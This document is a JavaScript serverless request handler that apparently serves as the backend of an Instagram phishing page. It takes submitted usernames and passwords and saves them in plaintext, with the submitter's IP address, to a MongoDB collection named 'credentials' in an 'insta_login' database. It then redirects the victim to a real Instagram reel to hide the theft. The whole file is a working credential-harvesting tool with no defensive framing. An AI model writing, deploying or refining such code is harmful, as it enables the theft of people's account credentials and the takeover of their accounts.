import { MongoClient } from 'mongodb';

const MONGODB_URI = process.env.MONGODB_URI;

export default async function handler(req, res) {
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { u_name, pass } = req.body;

  // Validate inputs
  if (!u_name || !pass) {
    return res.status(400).json({ error: 'Please enter correct username or password. Try again' });
  }

  // Check if MongoDB URI is set
  if (!MONGODB_URI) {
    console.error('Missing MONGODB_URI environment variable');
    return res.status(500).json({ error: 'Server configuration error' });
  }

  let client;
  try {
    client = new MongoClient(MONGODB_URI, {
      tls: true,
      connectTimeoutMS: 10000,
      serverSelectionTimeoutMS: 10000,
      serverApi: {
        version: '1',
        strict: true,
        deprecationErrors: true,
      },
    });
    await client.connect();

    const database = client.db('insta_login');
    const logins = database.collection('credentials');

    // Save credentials to database
    const result = await logins.insertOne({
      username: u_name,
      password: pass,
      timestamp: new Date(),
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    });

    console.log('Credentials saved:', result.insertedId);

    // Return success
    return res.status(200).json({ 
      success: true, 
      redirect: 'https://www.instagram.com/reels/DYMs-EYKoqq/' 
    });
  } catch (error) {
    console.error('Database error:', error);
    return res.status(500).json({ error: `Unable to process request: ${error.message}` });
  } finally {
    if (client) {
      await client.close();
    }
  }
}
